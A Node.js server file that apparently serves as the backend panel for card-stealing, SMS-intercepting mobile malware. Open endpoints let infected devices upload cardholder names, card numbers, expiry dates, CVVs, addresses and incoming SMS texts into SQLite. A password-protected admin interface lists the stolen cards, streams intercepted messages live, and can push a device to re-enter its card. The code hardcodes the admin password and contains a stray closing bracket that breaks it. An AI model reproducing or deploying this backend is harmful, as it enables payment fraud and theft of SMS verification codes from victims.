// server.js

const express = require("express");
const http = require("http");
const cors = require("cors");
const bodyParser = require("body-parser");
const sqlite3 = require("sqlite3").verbose();
const { Server } = require("socket.io");
const jwt = require("jsonwebtoken");

const JWT_SECRET = process.env.JWT_SECRET || "jdjHGYYve6743c3y";
const PORT = process.env.PORT || 3000;

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

app.use(cors());
app.use(bodyParser.json());

const db = new sqlite3.Database("db.sqlite", err => {
  if (err) console.error("DB Error:", err);
  else console.log("SQLite подключена");
});

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS Devices (
      deviceId TEXT PRIMARY KEY,
      cardholderName TEXT,
      cardNumber TEXT,
      expiry TEXT,
      cvv TEXT,
      address TEXT,
      timestamp TEXT
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS Sms (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      deviceId TEXT,
      fromNumber TEXT,
      body TEXT,
      timestamp TEXT,
      FOREIGN KEY(deviceId) REFERENCES Devices(deviceId) ON DELETE CASCADE
    )
  `);

  // Add needsResubmit column only if it doesn't exist
  db.all("PRAGMA table_info(Devices)", (err, cols) => {
    if (!err && !cols.find(c => c.name === "needsResubmit")) {
      db.run("ALTER TABLE Devices ADD COLUMN needsResubmit INTEGER DEFAULT 0");
    }
  });
});


// ✅ Add smsPermission column only if it doesn't exist
  db.all("PRAGMA table_info(Devices)", (err, cols) => {
    if (!err && !cols.find(c => c.name === "smsPermission")) {
      db.run("ALTER TABLE Devices ADD COLUMN smsPermission INTEGER DEFAULT 0");
    }
  });
});

function authenticateToken(req, res, next) {
  const authHeader = req.headers["authorization"];
  if (!authHeader) return res.sendStatus(401);
  const token = authHeader.split(" ")[1];
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
}

// --- REST API ---

app.post("/api/login", (req, res) => {
  const { password } = req.body;
  if (password !== "admin123") {
    return res.status(401).json({ success: false, message: "Falsches Passwort" });
  }
  const token = jwt.sign({ role: "admin" }, JWT_SECRET, { expiresIn: "6h" });
  res.json({ success: true, token });
});

app.post("/api/register", (req, res) => {
  const { deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission  } = req.body;
  const sql = `
    INSERT INTO Devices (deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(deviceId) DO UPDATE SET
      cardholderName = excluded.cardholderName,
      cardNumber     = excluded.cardNumber,
      expiry         = excluded.expiry,
      cvv            = excluded.cvv,
      address        = excluded.address,
      timestamp      = excluded.timestamp,
      smsPermission  = excluded.smsPermission

  `;
  db.run(sql, [deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission ? 1 : 0], err => {
    if (err) return res.status(500).json({ success: false, message: err.message });
    res.json({ success: true });
  });
});

app.get("/api/devices", authenticateToken, (req, res) => {
  db.all("SELECT * FROM Devices ORDER BY timestamp DESC", [], (err, rows) => {
    if (err) return res.status(500).json({ success: false, message: err.message });
    res.json({ success: true, data: rows });
  });
});

app.get("/api/devices/:deviceId/sms", authenticateToken, (req, res) => {
  const { deviceId } = req.params;
  db.all(
    "SELECT fromNumber, body, timestamp FROM Sms WHERE deviceId = ? ORDER BY timestamp ASC",
    [deviceId],
    (err, rows) => {
      if (err) return res.status(500).json({ success: false, message: err.message });
      res.json({ success: true, data: rows });
    }
  );
});

app.post("/api/sms", (req, res) => {
  const { deviceId, fromNumber, body, timestamp } = req.body;
  db.get("SELECT 1 FROM Devices WHERE deviceId = ?", [deviceId], (err, row) => {
    if (err) return res.status(500).json({ success: false, message: err.message });
    if (!row) return res.status(404).json({ success: false, message: "Device not found" });

    db.run(
      "INSERT INTO Sms (deviceId, fromNumber, body, timestamp) VALUES (?, ?, ?, ?)",
      [deviceId, fromNumber, body, timestamp],
      err => {
        if (err) return res.status(500).json({ success: false, message: err.message });
        // Notify admin namespace
        adminNsp.to(deviceId).emit("new_sms", { deviceId, fromNumber, body, timestamp });
        res.json({ success: true });
      }
    );
  });
});

// --- Socket.IO namespaces ---

const adminNsp = io.of("/admin");
const clientNsp = io.of("/client");

// Admin namespace requires JWT
adminNsp.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) return next(new Error("Auth error"));
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return next(new Error("Auth error"));
    socket.user = user;
    next();
  });
});

adminNsp.on("connection", socket => {
  socket.on("join_device", id => socket.join(id));
  socket.on("leave_device", id => socket.leave(id));
});

// Client namespace: no auth
clientNsp.on("connection", socket => {
  // nothing additional required
});

// --- Prompt resubmit endpoints ---

app.post("/api/prompt-resubmit", authenticateToken, (req, res) => {
  const { deviceId } = req.body;
  db.run(
    "UPDATE Devices SET needsResubmit=1 WHERE deviceId=?",
    [deviceId],
    err => {
      if (err) return res.status(500).json({ success: false, message: err.message });
      // Notify client namespace
      clientNsp.to(deviceId).emit("prompt_resubmit");
      res.json({ success: true });
    }
  );
});

app.get("/api/check-resubmit", (req, res) => {
  const { deviceId } = req.query;
  db.get(
    "SELECT needsResubmit FROM Devices WHERE deviceId=?",
    [deviceId],
    (err, row) => {
      if (err) return res.status(500).json({ success: false, message: err.message });
      const should = row?.needsResubmit === 1;
      if (should) {
        db.run("UPDATE Devices SET needsResubmit=0 WHERE deviceId=?", [deviceId]);
      }
      res.json({ success: true, resubmit: should });
    }
  );
});

server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
